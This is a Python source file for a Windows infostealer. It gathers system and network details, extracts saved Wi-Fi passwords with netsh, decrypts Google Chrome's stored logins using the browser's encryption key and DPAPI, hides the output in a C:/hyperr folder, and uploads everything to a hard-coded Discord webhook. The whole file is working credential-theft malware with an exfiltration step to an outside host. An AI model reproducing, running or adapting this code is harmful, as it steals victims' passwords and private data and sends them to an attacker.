import os
import subprocess
import discord
from discord import Webhook, RequestsWebhookAdapter
import platform
import json
import psutil
import shutil
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime, timedelta

disc_seperator = '=' * 116 * 2
webhook = Webhook.from_url(
    'https://discord.com/api/webhooks/987090926495211600/hsW7atCJ5G7O9UEONMkqBmrtasgywumIMXdKM8VvaLHGWFw-Non9DVse0BXCZUAcf7OC',
    adapter=RequestsWebhookAdapter()
)

cmpi = {
    'platform': platform.system(),
    'platform-release': platform.release(),
    'platform-version': platform.version(),
    'architecture': platform.machine(),
    'processor': platform.processor(),
    'ram': str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB",
    'username': os.getlogin(),
}

netd = {
    'info': subprocess.check_output(['ipconfig', '/all']).decode('utf-8').split('\n')
}

datacompute = {
    'platform': platform.system(),
    'platform-release': platform.release(),
    'platform-version': platform.version(),
    'architecture': platform.machine(),
    'processor': platform.processor(),
    'ram': str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB",
    'username': os.getlogin(),
    '': '',

}

directory = "/hyperr"
parent_dir = "C:"
path = os.path.join(parent_dir, directory)

comp_data = path + '/computer_data.json'
net_data = path + '/net_data.json'
interpass = path + '/interpass.txt'
chromepass = path + '/chromepass.txt'

files = [comp_data, net_data, interpass, chromepass]

if os.path.exists(path):
    shutil.rmtree(path, ignore_errors=True)
    os.mkdir(path)
else:
    os.mkdir(path)
    subprocess.check_call(["attrib", "+H", path])


def filewriting():
    with open(comp_data, 'a') as cd:
        cd.write(json.dumps(cmpi, indent=2))
    with open(net_data, 'a') as nd:
        nd.write(json.dumps(netd, indent=4))
    with open(interpass, 'a') as ip:
        a = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="ignore").split(
            '\n')
        a = [i.split(":")[1][1:-1] for i in a if "All User Profile" in i]
        for i in a:
            try:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode(
                    'utf-8', errors="ignore").split('\n')
                results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                try:
                    ip.write("{:<30}|  {:<}\n".format(i, results[0]))
                except IndexError:
                    ip.write('\n' + "{:<30}|  {:<}".format(i, ""))
            except subprocess.CalledProcessError:
                ip.write("{:<30}|  {:<}".format(i, "ENCODING ERROR"))


filewriting()


def sendData():
    with open(file=comp_data, mode='rb') as cd:
        sendcompdata = discord.File(cd)
    with open(file=net_data, mode='rb') as nd:
        sendnetdata = discord.File(nd)
    with open(file=interpass, mode='rb') as ip:
        sendinterpassdata = discord.File(ip)
    with open(file=chromepass, mode='rb') as cp:
        sendchromepass = discord.File(cp)
    webhook.send(content=disc_seperator)
    webhook.send(content=f'{os.getlogin()}::')
    webhook.send(content=disc_seperator)
    webhook.send(file=sendcompdata)
    webhook.send(file=sendnetdata)
    webhook.send(file=sendinterpassdata)
    webhook.send(file=sendchromepass)
    webhook.send(content=disc_seperator)


def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""


def main():
    with open(chromepass, 'a') as c:
        key = get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            if username or password:
                c.write(f"\nOrigin URL: {origin_url}\n")
                c.write(f"Action URL: {action_url}\n")
                c.write(f"Username: {username}\n")
                c.write(f"Password: {password}")
            else:
                continue
            if date_created != 86400000000 and date_created:
                c.write(f"Creation date: {str(get_chrome_datetime(date_created))}\n")
            if date_last_used != 86400000000 and date_last_used:
                c.write(f"Last Used: {str(get_chrome_datetime(date_last_used))}\n")
            c.write("=" * 50)
        cursor.close()
        db.close()
        try:
            os.remove(filename)
        except:
            pass


if __name__ == "__main__":
    main()


sendData()
